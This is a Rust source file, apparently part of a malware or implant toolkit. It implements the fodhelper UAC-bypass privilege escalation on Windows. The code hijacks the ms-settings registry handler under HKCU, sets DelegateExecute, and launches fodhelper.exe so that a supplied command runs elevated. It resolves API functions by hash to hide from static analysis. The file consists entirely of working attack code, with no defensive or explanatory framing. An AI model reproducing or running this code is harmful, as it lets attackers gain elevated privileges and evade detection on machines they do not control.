#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct PrivEsc;

impl PrivEsc {
    pub fn fodhelper(&self, cmd: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let reg_create = resolve_function(advapi32, hash_str(b"RegCreateKeyExA"));
            let reg_set = resolve_function(advapi32, hash_str(b"RegSetValueExA"));
            let reg_close = resolve_function(advapi32, hash_str(b"RegCloseKey"));

            if reg_create.is_null() || reg_set.is_null() { return Err(()); }

            type FnRegCreateKeyExA = unsafe extern "system" fn(HANDLE, *const u8, u32, *const u8, u32, u32, *const c_void, *mut HANDLE, *mut u32) -> i32;
            type FnRegSetValueExA = unsafe extern "system" fn(HANDLE, *const u8, u32, u32, *const u8, u32) -> i32;
            type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;

            let h_hkcu = 0x80000001 as HANDLE;
            let subkey = b"Software\\Classes\\ms-settings\\Shell\\Open\\command\0";
            let mut h_key: HANDLE = core::ptr::null_mut();

            core::mem::transmute::<_, FnRegCreateKeyExA>(reg_create)(
                h_hkcu, subkey.as_ptr(), 0, core::ptr::null(), 0, 0x20006, core::ptr::null(), &mut h_key, core::ptr::null_mut()
            );

            // DelegateExecute
            core::mem::transmute::<_, FnRegSetValueExA>(reg_set)(
                h_key, b"DelegateExecute\0".as_ptr(), 0, 1, b"\0".as_ptr(), 1
            );

            // Default
            let mut cmd_c = Vec::from(cmd.as_bytes()); cmd_c.push(0);
            core::mem::transmute::<_, FnRegSetValueExA>(reg_set)(
                h_key, core::ptr::null(), 0, 1, cmd_c.as_ptr(), cmd_c.len() as u32
            );

            core::mem::transmute::<_, FnRegCloseKey>(reg_close)(h_key);

            // Execute fodhelper.exe
            let shell = crate::modules::shell::Shell;
            let _ = shell.exec("fodhelper.exe");
            
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = cmd;
            Err(())
        }
    }
}
